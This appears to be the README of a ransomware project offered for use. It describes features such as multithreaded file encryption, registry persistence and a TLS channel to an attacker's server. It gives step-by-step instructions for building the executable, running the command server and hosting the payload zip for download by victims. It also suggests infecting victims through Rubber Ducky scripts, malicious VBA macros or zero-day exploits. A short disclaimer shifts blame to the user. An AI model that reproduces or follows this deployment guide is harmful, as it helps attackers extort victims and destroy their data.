# Ransomware Project

## Disclaimer

* Using this ransomware to attack personal computers and/or enterprise without consent is consider as an illegal activity. The end user is responsible to know the laws before any kind of use. The authors does not assume any consequences or any other illegals use of it and damages caused by it.

## About
This is the second version of a hand made ransomware. To use it, you will need :
* Python version 3
* A machine acting as a server
* A victim machine

You will need also those libraries :
* pip install cryptography
* pip install cx-freeze

The two other folders aim to infect a victim :
* "Rubber Ducky code" focus on a physical attack with a Ducky script
* "VBA code" is more oriented on a social engineering attack by forcing a user to open a macro

## Features
* This ransomware uses a multi-threading system to improve the encrypting process
* The connection between the client and the victim is encrypted with a TLS socket
* This ransomware encrypts the externals HDD/SSD files
* Generate an ID for the victim machine
* Create multiple registry keys (Persistence)
* Remove the key from memory (unfortunately, you need to reboot the machine for that. It will be improved later)

## Notes
* The encrypt files are lost if the key is not the right one (there is no checking process)
* To avoid some issues with the GUI (Tkinter module), you will need to add two DLL files "tcl86t.dll" and "tk86t.dll". Their paths must be specify in the setup.py file.
* An icon is necessary. You will need to add it in the new folder (created by setup.py) and name it "icon.ico"

## How to use it
Note : to do the following steps, it's recommended using a Kali Linux
1. You need to create an executable (don't forget "tcl86t.dll", "tk86t.dll" and "icon.ico")
   * python3 setup.py build
   * In the folder containing the executable, add "icon.ico", zip the folder and call it "ransomware.zip"
2. On your server
   * Create a certificate and call it "cert.pem" :
     * openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
   * Now, in the same folder as your certificate call this command :
     * python3 Server.py (you can kill it with a CTRL+C)
   * In an other terminal, start the HTTP server :
     * service apache2 start (don't forget to move ransomware.zip in /var/www/html/ folder)
3. On the victim machine
   * Find a way to infect the victim, to do so, you can :
     * Use a Rubber Ducky
     * Use a social engineering attack
     * Use a zero day exploit
     * Use your imagination

## Bonus
* Check the conference about it (it's in French)
[Link here](https://www.youtube.com/watch?v=UxkXiaHBQOE)
